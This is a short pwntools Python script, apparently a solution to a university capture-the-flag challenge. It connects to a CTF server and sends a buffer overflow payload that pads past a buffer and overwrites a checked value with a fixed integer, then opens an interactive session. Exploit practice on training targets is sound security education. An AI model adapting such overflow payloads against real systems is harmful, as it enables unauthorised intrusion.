from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7004)

payload = b''
# pad until check location
payload += b'A' * (0x20-0xC)
# insert required value
payload += p32(0x37333331)

p.sendline(payload)

p.interactive()